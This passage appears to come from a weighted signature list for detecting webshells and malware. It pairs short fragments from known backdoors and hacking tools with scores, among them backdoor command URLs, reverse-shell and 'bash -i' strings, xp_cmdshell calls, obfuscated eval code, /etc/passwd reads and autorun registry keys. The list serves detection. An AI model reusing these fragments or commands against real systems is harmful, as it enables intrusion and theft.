    ("string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,", 90),
    ("\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var", 90),
    ("\"<p><input type=\\\"hidden\\\" name=\\\"selectDb\\\" value=\\\"\"+selectDb+\"", 90),
    ("'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*", 90),
    ("// encrypt your password to md5 here http://kerinci.net/?x=decode", 90),
    ("<b>Bind /bin/bash at port: </b><input type=text name=port size=8>", 90),
    ("<input type=submit name=actarcbuff value=\\\"Pack buffer to archive", 90),
    ("The encoded password is found at 0x%8.8lx and has a length of %d.", 90),
    ("ports = \"21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500\";", 90),
    ("return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);", 90),
    ("return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\"", 90),
    ("%s -Uninstall                        -->To Uninstall The Service", 90),
    ("<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>", 90),
    ("<script language=javascript src=http://java-se.com/o.js</script>", 90),
    ("Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd", 90),
    ("You must have administrator privileges to run fport - exiting...", 90),
    ("if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))", 90),
    ("if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {", 90),
    ("values = map(lambda x: x.value, theform[field])     # allows for", 90),
    ("\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+", 90),
    ("\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\"", 90),
    ("# dump variables (DEBUG SCRIPT) NEEDS MODIFINY FOR B64 STATUS!!", 90),
    ("#change this password; for power security - delete this file =)", 90),
    ("$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";", 90),
    ("<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm", 90),
    ("Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:", 90),
    ("Sorry,DarkSpy got an unknown exception,please re-run it,thanks!", 90),
    ("String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1", 90),
    ("User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", 90),
    ("print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di", 90),
    ("sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());", 90),
    ("style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in", 90),
    ("\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur", 90),
    ("<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />", 90),
    ("<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on", 90),
    ("<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz", 90),
    ("ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))", 90),
    ("Don`t be stupid .. this is a priv3 server, so take extra care!", 90),
    ("Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>", 90),
    ("First we check if there has been asked for a working directory", 90),
    ("case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas", 90),
    ("displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));", 90),
    ("if (e.keyCode == 38 && current_line < command_hist.length-1) {", 90),
    ("if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');", 90),
    ("$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";", 90),
    ("<div align=\"left\"><font size=\"1\">Input command :</font></div>", 90),
    ("<input type=text size=55 name=newfile value=\"$d/newfile.php\">", 90),
    ("<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>", 90),
    ("Common php webshells. Do not host the file(s) in your server!", 90),
    ("Document.frmSQL.mPage.value = Document.frmSQL.mPage.value - 1", 90),
    ("Obviously you replace the ip address with that of the target.", 90),
    ("PySystemState.initialize(System.getProperties(), null, argv);", 90),
    ("String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";", 90),
    ("displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));", 90),
    ("error_reporting(0); //If there is an error, we'll show it, k?", 90),
    ("long time = (System.currentTimeMillis() - starttime) / 1000l;", 90),
    ("print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";", 90),
    ("$License: NRV for UPX is distributed under special license $", 90),
    ("$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874", 90),
    ("<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>", 90),
    ("Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &", 90),
    ("ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);", 90),
    ("frames.byZehir.document.execCommand(command, false, option);", 90),
    ("nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))", 90),
    ("print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include ", 90),
    ("set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '", 90),
    ("##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##", 70),
    ("#To execute commands, simply include ?cmd=___ in the url. #", 70),
    ("((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);", 70),
    ("<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de", 70),
    ("<br><b>Please enter your USERNAME and PASSWORD to logon<br>", 70),
    ("<form method=\"POST\"><input type=hidden name=act value=\"ls\">", 70),
    ("<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"", 70),
    ("<td><code class=\"entry-[% if entry.all_rights %]mine[% else", 70),
    ("Could not write to file! (Maybe you didn't enter any text?)", 70),
    ("barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1", 70),
    ("public JythonShell(int columns, int rows, int scrollback) {", 70),
    ("rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font", 70),
    ("this(null, Py.getSystemState(), columns, rows, scrollback);", 70),
    ("while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {", 70),
    ("\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" .", 70),
    ("$('#tt2').tree('options').url = \"selectChild.action?checki", 70),
    ("$world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T'; ", 70),
    ("'Read /etc/passwd' => \"runcommand('etcpasswdfile','GET')\",", 70),
    ("/* I added this to ensure the script will run correctly...", 70),
    ("// note that linux = cmd and windows = \"cmd.exe /c + cmd\" ", 70),
    (":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316", 70),
    ("<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->", 70),
    ("<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER", 70),
    ("<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\"", 70),
    ("<div align=\"center\">The backup process has now started<br ", 70),
    ("<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>", 70),
    ("Displays a list of values and sub-keys in a registry Hive.", 70),
    ("ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()", 70),
    ("command_hist[current_line] = document.shell.command.value;", 70),
    ("document.shell.command.value = command_hist[current_line];", 70),
    ("if(is_readable($path)) antivirus($path.'/',$exs,$matches);", 70),
    ("print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie", 70),
    ("printit(\"Successfully opened reverse shell to $ip:$port\");", 70),
    ("ret.append(\"!!!! Process has timed out, destroyed !!!!!\");", 70),
    ("&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>", 70),
    ("'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',", 70),
    ("/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */", 70),
    ("<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">", 70),
    ("<b><font color=#83000>Execute system commands!</font></b>", 70),
    ("<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">    ", 70),
    ("<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B", 70),
    ("OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)", 70),
    ("array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),", 70),
    ("else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);", 70),
    ("elsif($Action eq \"command\") # user wants to run a command", 70),
    ("ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#", 70),
    ("onblur=\"document.shell.autoUpdate.checked= this.oldValue;", 70),
    ("print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d", 70),
    ("print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"", 70),
    ("* as email attachment, or send to a remote ftp server by", 70),
    ("// uses include('php://input') to execute arbritary code", 70),
    (";db_connect();header('Content-Type: application/octetstr", 70),
    ("<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   ", 70),
    ("<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>", 70),
    ("Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)", 70),
    ("UplInfo info = UploadMonitor.getInfo(fi.clientFileName);", 70),
    ("header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));", 70),
    ("if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))", 70),
    ("<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO", 70),
    ("<font size=3>by r3v3ng4ns - revengans@gmail.com </font>", 70),
    ("<input type=\"radio\" name=\"tac\" value=\"1\">B64 Decode<br>", 70),
    ("[ user@alturks.com ]# info<b><br><font face=tahoma><br>", 70),
    ("if(damapath!=null &&!damapath.equals(\"\")&&content!=null", 70),
    ("$_SESSION['output'] .= htmlspecialchars(fgets($io[1]),", 70),
    ("' -- create the COM objects that we will be using -- '", 70),
    ("//A workdir has been asked for - we chdir to that dir.", 70),
    ("<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />", 70),
    ("<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>", 70),
    ("System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x", 70),
    ("[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]", 70),
    ("eval(\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61", 70),
    ("header(\"Content-disposition: filename=$filename.sql\");", 70),
    ("if (!$from && !$subject && !$message && !$emaillist){ ", 70),
    ("private static final String[] COMMAND_INTERPRETER = {\"", 70),
    ("return new Double(format.format(value)).doubleValue();", 70),
    ("#   d00r.py 0.3a (reverse|bind)-shell in python by fQ", 70),
    ("'Running processes' => \"runcommand('ps -aux','GET')\",", 70),
    ("<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>", 70),
    ("<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">", 70),
    ("<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>", 70),
    ("An encryption key is derived from the password hash. ", 70),
    ("Empty Command..type \\\"shellhelp\\\" for some ehh...help", 70),
    ("Enter a menu selection number (1 - 3) or 99 to Exit: ", 70),
    ("Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 70),
    ("for each i in Split(http.getAllResponseHeaders, vbLf)", 70),
    ("header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));", 70),
    ("osw = new BufferedWriter(new OutputStreamWriter(os));", 70),
    ("</font></span><a href=\"mailto:shopen@aventgrup.net\">", 70),
    ("<form action=\"shell.asp\" method=\"POST\" name=\"shell\">", 70),
    ("<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\">", 70),
    ("<input name=\"password\" type=\"password\" id=\"password\"", 70),
    ("<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />", 70),
    ("<option value=\"/etc/passwd\">Get /etc/passwd</option>", 70),
    ("<option value=\"cat /etc/passwd\">/etc/passwd</option>", 70),
    ("add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');", 70),
    ("curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);", 70),
    ("isr = new BufferedReader(new InputStreamReader(is));", 70),
    ("password = (String)session.getAttribute(\"password\");", 70),
    ("print \"Sorry, none of the command functions works.\";", 70),
    (" http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave ", 70),
    ("!22222222222222222222222222222222222222222222222222", 70),
    ("'// By Ferruh Mavituna | http://ferruh.mavituna.com", 70),
    ("/* The last / in work_dir were the first charecter.", 70),
    ("@copy($file,$to) or die (\"[-]Error copying file!\");", 70),
    ("Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)", 70),
    ("Liz0ziM Private Safe Mode Command Execuriton Bypass", 70),
    ("OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";", 70),
    ("Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">", 70),
    ("String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";", 70),
    ("Victim Mail :<br><input type='text' name='to' ><br>", 70),
    ("curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");", 70),
    ("header ( \"Content-Description: Download manager\" );", 70),
    ("header('Content-Length: '.strlen($dump_file).\"\\n\");", 70),
    ("url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");", 70),
    ("\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd", 70),
    ("//fake mail = Use victim server 4 DOS - fake mail ", 70),
    ("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">", 70),
    ("<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">", 70),
    ("<textarea name=\"c\" cols=60 rows=15></textarea><br>", 70),
    ("Port: <input name=\"port\" type=\"text\" value=\"8888\">", 70),
    ("SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security", 70),
    ("command = \"nslookup -type=\" & qtype & \" \" & query ", 70),
    ("has been already loaded. PHP Emperor <xb5@hotmail.", 70),
    ("http://www.security-teams.net/index.php?showtopic=", 70),
    ("if (frmUpload.max.value<=0) frmUpload.max.value=1;", 70),
    ("if(!$result2)$dump_file.='#error table '.$rows[0];", 70),
    ("print \"<center><h1>#worst @dal.net</h1></center>\";", 70),
    ("$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";", 70),
    ("$world[\"execute\"] = ($mode & 00001) ? 'x' : '-'; ", 70),
    ("'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)", 70),
    ("- AK-74 Security Team Web Site: www.ak74-team.net", 70),
    ("</span>Avrasya Veri ve NetWork Teknolojileri Geli", 70),
    ("<a href=\"javascript:godir(\\''.$drive->Path.'/\\');", 70),
    ("<font color='red'><b>Connection Error!</b></font>", 70),
    ("<input type=\"radio\" name=\"tac\" value=\"3\">md5 Hash", 70),
    ("<input type='submit' value='  open (shill.txt) '>", 70),
    ("<meta http-equiv=\"Content-Language\" content=\"tr\">", 70),
    ("FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");", 70),
    ("action=mysqlread&mass=loadmass\">load all defaults", 70),
    ("if(filetype($dir . $file)==\"file\")$files[]=$file;", 70),
    ("nxeDR.Command+=new CommandEventHandler(this.iVk);", 70),
    ("open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");", 70),
    ("$dump .= \"-- Dumping data for table '$table'\\n\";", 70),
    ("$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';", 70),
    ("$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';", 70),
    ("' *** Written by Tim Medin <tim@counterhack.com>", 70),
    ("<font color=\"#000000\">Sil</font></a></font></td>", 70),
    ("<input type=\"hidden\" name=\"doing\" value=\"login\">", 70),
    ("<td><font color=\\\"#990000\\\">Win Dir:</font></td>", 70),
    ("<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>", 70),
    ("<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]", 70),
    ("FileInputStream fInput = new FileInputStream(f);", 70),
    ("Shared Components\\On Access Scanner\\BehaviourBlo", 70),
    ("SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend", 70),
    ("[DllImport(\"Advapi32.dll\", SetLastError = true)]", 70),
    ("connect failed,check your network and remote ip.", 70),
    ("lsExt = Right(FileName, Len(FileName) - liCount)", 70),
    ("xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc", 70),
    ("\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb", 70),
    ("$owner[\"write\"] = ($mode & 00200) ? 'w' : '-'; ", 70),
    ("&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>", 70),
    ("' -- Use a poor man's pipe ... a temp file -- '", 70),
    ("AK-74 Security Team Web Site: www.ak74-team.net", 70),
    ("echo(\"<form method='post' action='?act=sql'>\");", 70),
    ("echo('Dump for '.$db_dump.' now in '.$to_file);", 70),
    ("else { /* <!-- Then it must be a File... --> */", 70),
    ("error_reporting(E_ERROR | E_WARNING | E_PARSE);", 70),
    ("function ftp_check($host,$user,$pass,$timeout){", 70),
    ("if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};", 70),
    ("print \"<center><h1>Linux Shells</h1></center>\";", 70),
    ("while(list($kname, $columns) = @each($index)) {", 70),
    ("\"phpshellapp\" => \"export TERM=xterm; bash -i\",", 70),
    ("#Use: python wh_bindshell.py [port] [password]", 70),
    ("$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';", 70),
    ("$world[\"write\"] = ($mode & 00002) ? 'w' : '-';", 70),
    ("/* No work_dir - we chdir to $DOCUMENT_ROOT */", 70),
    ("<meta name=\"Copyright\" content=TouCh By iJOo\">", 70),
    ("<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> ", 70),
    ("<td width=\"122\" height=\"17\" bgcolor=\"#9F9F9F\">", 70),
    ("<title>$MyShellVersion - Access Denied</title>", 70),
    ("@mssql_query(\"drop table r57_temp_table\",$db);", 70),
    ("A:visited { COLOR:blue; TEXT-DECORATION: none}", 70),
    ("D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC", 70),
    ("URLConnection conn = downUrl.openConnection();", 70),
    ("array_unshift($_SESSION['history'], $command);", 70),
    ("die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File", 70),
    ("die(\"<font color=#DF0000>Login error</font>\");", 70),
    ("move_uploaded_file($userfile, \"entrika.php\"); ", 70),
    ("print \"Transfered $TargetFileSize Bytes.<br>\";", 70),
    ("yc0CJYb+O//Xgj9/y+U/dd//vkf'\\x29\\x29\\x29\\x3B\")", 70),
    (" $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";", 70),
    ("\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi", 70),
    ("' --------------------o0o--------------------", 70),
    ("// BUG: Corta el fichero si es mayor de 640Ks", 70),
    ("<input type=\"submit\" name=\"Send\" value=\"GO!\">", 70),
    ("<input type=submit value=\"Test Et!\" onclick=\"", 70),
    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 70),
    ("class=linelisting><nobr>POST (php eval)</td><", 70),
    ("displaysecinfo(\"RAM\",myshellexec(\"free -m\"));", 70),
    ("header('Content-Length:'.filesize($file).'');", 70),
    ("private static final int EDITFIELD_ROWS = 30;", 70),
    ("while (file_exists(\"$lastdir/newfile$i.txt\"))", 70),
    ("write(\"#\\n#Server : \".getenv('SERVER_NAME').\"", 70),
    ("### Gamma Group <http://www.gammacenter.com>", 70),
    ("&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>", 70),
    ("/* ls looks much better with ' -F', IMHO. */", 70),
    ("<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">", 70),
    ("<die(\"Couldn't Read directory, Blocked!!!\");", 70),
    ("<p><strong>Server listeleyici</strong><br />", 70),
    ("<title>MyShell error - Access Denied</title>", 70),
    ("<title>h4ntu shell [powered by tsoi]</title>", 70),
    ("A:active {COLOR:blue; TEXT-DECORATION: none}", 70),
    ("Server address must be IP in A.B.C.D format.", 70),
    ("if ($filename != \".\" and $filename != \"..\"){", 70),
    ("safe_mode and open_basedir Bypass PHP 5.2.9 ", 70),
    ("sbFolder.append(\"<tr><td >&nbsp;</td><td>\");", 70),
    ("szTempFile = \"C:\\\" & oFileSys.GetTempName( )", 70),
    ("username = DumpAccountSid(tokUser.User.Sid);", 70),
    ("wangyong,czy,allen,lcx,Marcos,kEvin1986,myth", 70),
    ("$tabledump .= \"   PRIMARY KEY ($colnames)\";", 70),
    ("-- Use a poor man's pipe ... a temp file --", 70),
    ("<!--    http://michaeldaw.org   2006    -->", 70),
    ("<? if($cmd != \"\") print Shell_Exec($cmd);?>", 70),
    ("<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">", 70),
    ("<input type = \"text\" name = \"url\" value = \"", 70),
    ("Changes the base hive to HKEY_CURRENT_USER.", 70),
    ("Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")", 70),
    ("input the password(the default one is 'by')", 70),
    ("name=\"theAction\" type=\"text\" id=\"theAction\"", 70),
    ("s = urlscheme & urlhost & urlport & urlpath", 70),
    ("wrap=\"OFF\">XXXX</textarea></font><font face", 70),
    (" :=) :</font><select size=\"1\" name=\"liz0\">", 70),
    ("# Author Homepage: http://www.rohitab.com/", 70),
    ("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\", 70),
    ("else if(Reg_Path.StartsWith(\"HKEY_USERS\"))", 70),
    ("http://ayyildiz.org/images/whosonline2.gif", 70),
    ("kingdefacer@msn.com</FONT></CENTER></B>\");", 70),
    ("public static int DEFAULT_SCROLLBACK = 100", 70),
    ("sh_out=os.popen(SHELL+\" \"+cmd).readlines()", 70),
    ("while(!feof($f)) { $res.=fread($f,1024); }", 70),
    ("$info .= (($perms & 0x0004) ? 'r' : '-');", 70),
    ("$tabledump .= \"CREATE TABLE $table (\\n\"; ", 70),
    ("<span>Posix_getpwuid (\"Read\" /etc/passwd)", 70),
    ("SYSTEM\\CurrentControlSet\\Services\\NtfsChk", 70),
    ("The Server Password Exceeds 32 Characters", 70),
    ("The password has been added to the hash. ", 70),
    ("curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);", 70),
    ("destino3 = folderItem.path & \"\\index.asp\"", 70),
    ("echo(\"<form method='GET' name='shell'>\");", 70),
    ("if (!function_exists(\"c99_buff_prepare\"))", 70),
    ("jQuery(\"<div>\").html(data).evalScripts();", 70),
    ("// me at pentestmonkey@pentestmonkey.net", 70),
    ("6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j", 70),
    ("<body onload=\"document.shell.c.focus()\">", 70),
    ("<cfif ( #suppliedCode# neq secretCode )>", 70),
    ("H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw", 70),
    ("HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm", 70),
    ("PVAX SW, Alexey A. Popoff, Moscow, 1997.", 70),
    ("SYSTEM\\CurrentControlSet\\Services\\NtBoot", 70),
    ("cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV", 70),
    ("print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST", 70),
    ("return $type . $owner . $group . $other;", 70),
    ("str_replace('* @package Wordpress',$temp", 70),
    ("touch (\"$path/$dismi\") or die(\"Dosya Olu", 70),
    ("} elseif (($perms & 0x8000) == 0x8000) {", 70),
    ("~|_Team .:National Cracker Crew:._|~<br>", 70),
    ("\"http://www.w3.org/TR/html4/loose.dtd\">", 70),
    ("// url:http://www.weigongkai.com/shell/", 70),
    ("<font color=\"#858585\">www.aventgrup.net", 70),
    ("<option value=\\\"az\\\">a - zzzzz</option>", 70),
    ("This server has been infected by $owner", 70),
    ("directory... Trust me - it works :-) */", 70),
    ("print \"error; help: head -n 16 d00r.py\"", 70),
    ("xcurl('http://pastebin.com/download.php", 70),
    ("|     -obzerve : mr_o@ihateclowns.com |", 70),
    ("$this -> addFile($content, $filename);", 70),
    ("&nbsp;e-mail : kingdefacer@msn.com<br>", 70),
    ("' ***  http://laudanum.secureideas.net", 70),
    ("// list.php = Directory & File Listing", 70),
    ("//http://require.duapp.com/session.php", 70),
    ("This Exploit Was Edited By KingDefacer", 70),
    ("[url=http://www.governmentsecurity.org", 70),
    ("entrika.write \"BinaryStream.SaveToFile", 70),
    ("exec \"c:\\WINDOWS\\System32\\freecell.exe", 70),
    ("file_get_contents(\"http://pastebin.com", 70),
    ("frames.byZehir.document.execCommand(co", 70),
    ("http://www35.websamba.com/cybervurgun/", 70),
    ("my @adms=(\"Kelserific\",\"Puna\",\"nod32\")", 70),
    ("perl asmodeus.pl client 6666 127.0.0.1", 70),
    ("xb5@hotmail.com</FONT></CENTER></B>\");", 70),
    (" mapped ports in the list. Currently ", 70),
    ("' Author: Maceo <maceo @ dogmile.com>", 70),
    ("* Neagu Mihai<neagumihai@hotmail.com>", 70),
    ("<FORM METHOD=GET ACTION='cmdjsp.jsp'>", 70),
    ("<form action=\"?Gonder\" method=\"post\">", 70),
    ("<form action=ntdaddy.asp method=post>", 70),
    ("A new key container has been created.", 70),
    ("cut -d: -f1,2,3 /etc/passwd | grep ::", 70),
    ("input source port(whatever you want):", 70),
    ("print \"Sending mail to $to....... \"; ", 70),
    ("# Servidor de irc que vai ser usado ", 70),
    ("###command:(NO more than 100 bytes!)", 70),
    ("$contents .= htmlentities( $line ) ;", 70),
    ("/* We try and match a cd command. */", 70),
    ("// It's simple shell for all Win OS.", 70),
    ("<servlet-name>Command</servlet-name>", 70),
    ("Http://code.google.com/p/b374k-shell", 70),
    ("NTDaddy v1.9 by obzerve of fux0r inc", 70),
    ("Set objCmd = objWShell.Exec(command)", 70),
    ("filename=\\\"dump_{$db_dump}_${table_d", 70),
    ("frames.byZehir.document.execCommand(", 70),
    ("http://popeye.snu.ac.kr/~smkim/mysql", 70),
    ("print \"Sending mail to $to....... \";", 70),
    ("private static String tempdir = \".\";", 70),
    ("scrollbar-darkshadow-color: #101842;", 70),
    (" if (is_uploaded_file($userfile)) {", 70),
    ("$command .= \" 1> $tmpfile 2>&1; \" .", 70),
    ("$dump .= \"CREATE TABLE $table (\\n\";", 70),
    ("&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR", 70),
    ("--list the services in the computer", 70),
    ("9--Set Procecess Name To Inject DLL", 70),
    ("</a> | <a href=\"?action=phpenv\">PHP", 70),
    ("<b>Dumped! Dump has been writed to ", 70),
    ("<title>Upload - Shell/Datei</title>", 70),
    ("@ini_restore(\"safe_mode_exec_dir\");", 70),
    ("Add UNIQUE ID for victims / zombies", 70),
    ("B374k Vip In Beautify Just For Self", 70),
    ("Process[] p=Process.GetProcesses();", 70),
    ("URL downUrl = new URL(downFileUrl);", 70),
    ("else shelL(\"perl.exe $name $port\");", 70),
    ("s72 Shell v1.0 Codinf by Cr@zy_King", 70),
    ("scrollbar-darkshadow-color:#9C9CD3;", 70),
    ("scrollbar-darkshadow-color:#FF9DBB;", 70),
    ("# in a command line on Windows NT.", 70),
    ("$dump .= \"-- Cyber-Warrior.Org\\n\";", 70),
    ("$sess_data[\"cut\"] = array(); c99_s", 70),
    ("' ---Copy Too Folder routine Start", 70),
    ("<form action=\"?oku\" method=\"post\">", 70),
    ("<title>G-Security Webshell</title>", 70),
    ("@ini_restore(\"disable_functions\");", 70),
    ("Can't open file, permission denide", 70),
    ("Copyright 2000 by Foundstone, Inc.", 70),
    ("Dumping Description to Registry...", 70),
    ("If ( AttackID = BROADCAST_ATTACK )", 70),
    ("Network security team :: CGI Shell", 70),
    ("Welcome to phpRemoteView (RemView)", 70),
    ("document.cmdform.command.value='';", 70),
    ("endPoint=random1.getFilePointer();", 70),
    ("header(\"Content-type: image/gif\");", 70),
    ("if (($perms & 0xC000) == 0xC000) {", 70),
    ("lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2", 70),
    ("onfocus=\"if (this.value == 'Kullan", 70),
    ("var frameId = 'jUploadFrame' + id;", 70),
    ("xcurl('http://pastebin.com/raw.php", 70),
    ("#bugz: ctrl+c etc =script stoped=", 70),
    ("(($perms & 0x0400) ? 'S' : '-'));", 70),
    ("+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO", 70),
    ("<form method=\"post\" name=\"shell\">", 70),
    ("<form name=\"shell\" method=\"post\">", 70),
    ("<title>lama's'hell v. 3.0</title>", 70),
    ("Jayalah Indonesiaku & Lyke @ 2013", 70),
    ("NTFS Disk Driver Checking Service", 70),
    ("SCROLLBAR-3DLIGHT-COLOR: #cccccc;", 70),
    ("\\\\.\\mailslot\\hxdef-rk100sABCDEFGH", 70),
    ("date_default_timezone_set('PRC');", 70),
    ("header(\"HTTP/1.0 404 Not Found\");", 70),
    ("if($file != \".\" && $file != \"..\")", 70),
    ("print \"Asmodeus Perl Remote Shell", 70),
    ("#   [+] Domain name address type", 70),
    ("// Created by greenwood from n57", 70),
    ("<ERROR: THIS IS NOT A TEXT FILE>", 70),
    ("A hash object has been created. ", 70),
    ("By KingDefacer From Spygrup.org>", 70),
    ("File tempF = new File(savePath);", 70),
    ("Packet sent,waiting for reply...", 70),
    ("Provide Windows CmdShell Service", 70),
